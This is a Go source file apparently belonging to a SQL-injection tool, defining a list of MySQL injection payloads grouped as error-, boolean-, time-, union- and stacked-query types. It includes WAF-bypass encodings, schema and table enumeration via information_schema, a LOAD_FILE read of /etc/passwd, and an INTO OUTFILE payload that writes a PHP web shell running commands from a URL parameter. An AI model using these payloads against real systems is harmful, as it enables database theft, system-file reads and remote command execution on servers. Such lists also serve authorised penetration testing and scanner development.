package payloads

var MySQL = PayloadGroup{
	DBMS: "MySQL",
	Payloads: []Payload{
		// Error-based
		{Type: "error", Content: "' OR 1=1 --"},
		{Type: "error", Content: "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"},
		{Type: "error", Content: "extractvalue(1,concat(0x7e,(select user()),0x7e))"},
		{Type: "error", Content: "updatexml(1,concat(0x7e,(select user()),0x7e),1) "},
		{Type: "error", Content: "' AND 1=(SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 0,1),0x7e,FLOOR(RAND(0)*2)))--"},

		// Boolean-based
		{Type: "boolean", Content: "' AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "' AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' AND (SELECT 1)=1--", Expected: "true"},

		// Time-based
		{Type: "time", Content: "' AND SLEEP(5)--"},
		{Type: "time", Content: "1' AND (SELECT 2144 FROM (SELECT(SLEEP(5)))qwer)--"},
		{Type: "time", Content: "1' AND IF(1=1,SLEEP(5),0)--"},

		// Deep Exploitation (Data Extraction)
		{Type: "deep", Content: "' UNION SELECT GROUP_CONCAT(schema_name),NULL FROM information_schema.schemata--"},
		{Type: "deep", Content: "' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--"},

		// WAF Bypass (Polymorphic)
		{Type: "error", Content: "/*!50000%53eLEct*/ 1,2,3"},
		{Type: "error", Content: "1' %23%0a OR 1=1 --"},
		{Type: "error", Content: "admin' OR '1'='1' /*"},
		{Type: "error", Content: "' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT (ELT(1,1))), 0x7e, FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--"},

		// New Massively Effective Payloads
		{Type: "boolean", Content: "' AND (SELECT 1 FROM (SELECT(SLEEP(0)))a) AND '1'='1"},
		{Type: "boolean", Content: "' AND 1=1 OR '1'='2"},
		{Type: "error", Content: "1' AND (SELECT 1 FROM (SELECT(COUNT(*),CONCAT(0x7e,(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END)),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND '1'='1"},
		{Type: "error", Content: "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),0x7e))--"},
		{Type: "time", Content: "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"},
		{Type: "time", Content: "1' AND SLEEP(5) AND '1'='1"},
		{Type: "union", Content: "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7e,0x42,0x45,0x4e,0x43,0x48,0x4d,0x41,0x52,0x4b,0x7e),NULL--"},
		{Type: "stacked", Content: "'; WAITFOR DELAY '0:0:5'--"},
		{Type: "stacked", Content: "'; SELECT SLEEP(5);--"},

		// ADVANCED WAF BYPASS & OBSCURITY
		{Type: "error", Content: "'%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(5)))a)%20AND%20'1'='1"},
		{Type: "error", Content: "')) AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND (('1'='1"},
		{Type: "error", Content: "1' or (select 1 from(select count(*),concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.plugins group by x)a)--"},
		{Type: "error", Content: "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='1"},
		{Type: "error", Content: "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) UNION SELECT 1,2,3--"},
		{Type: "error", Content: "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) GROUP BY 1,2,3--"},

		// NO-SPACE BYPASS
		{Type: "error", Content: "'/**/OR/**/1=1/**/--"},
		{Type: "error", Content: "'%0AOR%0A1=1%0A--"},
		{Type: "error", Content: "'%0DOR%0D1=1%0D--"},
		{Type: "error", Content: "'%09OR%091=1%09--"},

		// HEX & DOUBLE ENCODING BYPASS
		{Type: "error", Content: "0x27204f5220313d31202d2d"},
		{Type: "error", Content: "%2527%2520OR%25201%253D1%2520--"},

		// ADVANCED BOOLEAN
		{Type: "boolean", Content: "' AND (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END))=1--"},
		{Type: "boolean", Content: "' AND (SELECT (CASE WHEN (1=2) THEN 1 ELSE 0 END))=1--"},
		{Type: "boolean", Content: "' AND IF(1=1,1,0)--"},
		{Type: "boolean", Content: "' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>64--"},

		// ADVANCED TIME
		{Type: "time", Content: "' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--"},
		{Type: "time", Content: "' AND BENCHMARK(10000000,MD5(1))--"},
		{Type: "time", Content: "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='1"},

		// UNION ADVANCED
		{Type: "union", Content: "' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--"},
		{Type: "union", Content: "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL--"},
		{Type: "union", Content: "' UNION ALL SELECT 'uninject','uninject','uninject'--"},

		// POST-EXPLOITATION (FILE READ/WRITE)
		{Type: "deep", Content: "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--"},
		{Type: "deep", Content: "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--"},
	},
}
